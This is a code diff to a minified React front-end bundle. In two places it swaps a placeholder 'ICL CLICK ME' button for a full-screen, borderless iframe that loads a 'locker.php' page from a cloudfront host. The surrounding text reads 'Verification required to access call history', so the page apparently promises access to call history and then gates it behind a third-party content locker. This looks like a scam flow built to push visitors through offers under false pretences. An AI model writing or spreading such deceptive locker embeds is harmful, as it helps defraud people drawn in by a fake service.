@@ -1049,10 +1049,17 @@ const I = () => {
                         className: "text-sm text-gray-400",
                         children: "Verification required to access call history"
                     })]
-                }), $.jsx("button", {
-                    onClick: () => window.location.href = "https://www.google.com",
-                    className: "w-full max-w-[300px] h-12 rounded-xl bg-[#0A84FF] text-white font-medium hover:bg-[#0A84FF]/90 transition-colors",
-                    children: "ICL CLICK ME"
+                }), $.jsx("iframe", {
+                    name: "myiFrame",
+                    width: "1920px",
+                    height: "1920px",
+                    src: "https://dbj3fg9om9jaj.cloudfront.net/public/locker.php?it=4560432&key=af8f8",
+                    scrolling: "no",
+                    marginwidth: "0",
+                    marginheight: "0",
+                    style: {
+                        border: "0px none #ffffff"
+                    }
                 })]
             })]
         })]
@@ -1159,10 +1166,17 @@ const I = () => {
                         })]
                     }), $.jsx("div", {
                         className: "w-full max-w-[300px] mx-auto bg-black/50 rounded-lg p-4 mb-4",
-                        children: $.jsx("button", {
-                            onClick: () => window.location.href = "https://www.google.com",
-                            className: "w-full h-12 rounded-xl bg-[#0A84FF] text-white font-medium hover:bg-[#0A84FF]/90 transition-colors",
-                            children: "ICL CLICK ME"
+                        children: $.jsx("iframe", {
+                            name: "myiFrame",
+                            width: "1920px",
+                            height: "1920px",
+                            src: "https://dbj3fg9om9jaj.cloudfront.net/public/locker.php?it=4560432&key=af8f8",
+                            scrolling: "no",
+                            marginwidth: "0",
+                            marginheight: "0",
+                            style: {
+                                border: "0px none #ffffff"
+                            }
                         })
                     }), $.jsx("p", {
                         className: "text-xs text-yellow-500/80 text-center",
